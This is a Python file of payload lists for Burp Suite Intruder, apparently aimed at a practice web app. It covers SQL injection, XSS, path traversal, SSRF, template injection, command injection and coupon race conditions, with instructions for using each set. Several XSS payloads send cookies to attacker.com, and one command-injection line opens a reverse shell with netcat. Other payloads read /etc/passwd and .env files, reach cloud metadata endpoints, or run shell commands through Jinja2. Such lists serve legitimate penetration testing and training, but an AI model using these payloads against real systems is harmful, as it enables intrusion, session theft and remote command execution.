"""
Burp Suite Professional Extensions and Payloads
Copy these payloads into Burp Intruder for automated testing
"""

# ==========================================
# SQL INJECTION PAYLOADS
# ==========================================

SQL_INJECTION_PAYLOADS = [
    # Basic SQL injection
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "admin' --",
    "' OR 'a'='a",
    
    # Union-based injection
    "' UNION SELECT 1,2,3,4 --",
    "' UNION SELECT username,password,email,role FROM users --",
    "' UNION SELECT sql,name,type,tbl_name FROM sqlite_master --",
    
    # Blind SQL injection
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND SUBSTRING(password,1,1)='a' --",
    
    # Time-based blind
    "'; WAITFOR DELAY '00:00:05' --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
]

# ==========================================
# XSS PAYLOADS
# ==========================================

XSS_PAYLOADS = [
    # Basic XSS
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    
    # Advanced XSS
    "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
    "<script>fetch('http://attacker.com/log?data='+btoa(document.cookie))</script>",
    
    # DOM XSS
    "javascript:alert('XSS')",
    "data:text/html,<script>alert('XSS')</script>",
    
    # Filter bypasses
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
]

# ==========================================
# DIRECTORY TRAVERSAL PAYLOADS
# ==========================================

DIRECTORY_TRAVERSAL_PAYLOADS = [
    # Linux paths
    "../../../etc/passwd",
    "../../../etc/hosts",
    "../../../proc/version",
    "../../../var/log/apache2/access.log",
    
    # Windows paths
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\windows\\win.ini",
    
    # Application files
    "../app.py",
    "../config.py",
    "../requirements.txt",
    "../.env",
    "../database.db",
    
    # Encoded payloads
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    
    # Null byte injection
    "../../../etc/passwd%00.txt",
    "../../../etc/passwd%00.jpg",
]

# ==========================================
# SSRF PAYLOADS
# ==========================================

SSRF_PAYLOADS = [
    # Internal network scanning
    "http://127.0.0.1:22",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:5432",
    "http://127.0.0.1:6379",
    "http://localhost:8080",
    
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    
    # Protocol smuggling
    "gopher://127.0.0.1:22/_SSH-2.0",
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/stat",
    
    # Bypass filters
    "http://127.1:80",
    "http://0.0.0.0:80",
    "http://[::1]:80",
    "http://2130706433:80",  # Decimal IP
]

# ==========================================
# SSTI PAYLOADS
# ==========================================

SSTI_PAYLOADS = [
    # Detection payloads
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    
    # Flask/Jinja2 payloads
    "{{config}}",
    "{{self.__init__.__globals__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    
    # Command execution
    "{{self.__init__.__globals__['os'].popen('id').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}}",
    
    # File read
    "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /etc/passwd').read()}}",
]

# ==========================================
# COMMAND INJECTION PAYLOADS
# ==========================================

COMMAND_INJECTION_PAYLOADS = [
    # Basic command injection
    "; whoami",
    "&& whoami",
    "|| whoami",
    "| whoami",
    
    # Command substitution
    "`whoami`",
    "$(whoami)",
    
    # File operations
    "; cat /etc/passwd",
    "; ls -la /",
    "; pwd",
    
    # Network operations
    "; ping -c 1 127.0.0.1",
    "; nc -e /bin/bash attacker.com 4444",
    
    # Windows commands
    "& whoami",
    "&& dir",
    "| type C:\\windows\\system32\\drivers\\etc\\hosts",
]

# ==========================================
# BUSINESS LOGIC PAYLOADS
# ==========================================

BUSINESS_LOGIC_PAYLOADS = [
    # Coupon codes for testing
    "SAVE10",
    "WELCOME5",
    "MEGA50",
    "DISCOUNT20",
    "NEWUSER",
    "FREESHIP",
    
    # Price manipulation
    "-100",    # Negative prices
    "0",       # Zero price
    "0.01",    # Minimal price
    "999999",  # Excessive price
    
    # Quantity manipulation
    "-1",      # Negative quantity
    "0",       # Zero quantity
    "999999",  # Excessive quantity
]

# ==========================================
# RACE CONDITION TEST DATA
# ==========================================

RACE_CONDITION_CONFIG = {
    "threads": 25,
    "delay": 0.001,  # 1ms delay between requests
    "target_endpoint": "/apply_coupon",
    "coupon_code": "SAVE10",
    "expected_timing_window": 300,  # 300ms timing window
}

# ==========================================
# BURP SUITE INTRUDER CONFIGURATIONS
# ==========================================

INTRUDER_CONFIGS = """
1. SQL INJECTION TESTING:
   - Position: Username field in login form
   - Attack type: Sniper
   - Payload: Use SQL_INJECTION_PAYLOADS above
   - Look for: Redirects to dashboard, different response lengths

2. XSS TESTING:
   - Position: Comment fields, search boxes
   - Attack type: Sniper  
   - Payload: Use XSS_PAYLOADS above
   - Look for: Reflected payload in response

3. DIRECTORY TRAVERSAL:
   - Position: File parameter in file viewing endpoints
   - Attack type: Sniper
   - Payload: Use DIRECTORY_TRAVERSAL_PAYLOADS above
   - Look for: File contents in response

4. RACE CONDITION (Manual):
   - Use Turbo Intruder extension
   - Load turbo_intruder_race_condition_manual.py
   - Target: /apply_coupon endpoint
   - Concurrent threads: 25

5. IDOR TESTING:
   - Position: ID parameters (user_id, order_id, etc.)
   - Attack type: Numbers payload (1-100)
   - Look for: Different user data in responses
"""

print("🔥 Burp Suite Payloads and Configurations")
print("Copy the payloads above into Burp Intruder for automated testing")
print("\nFor race condition testing, use the Turbo Intruder extension")
print("with the provided turbo_intruder_race_condition_manual.py script")
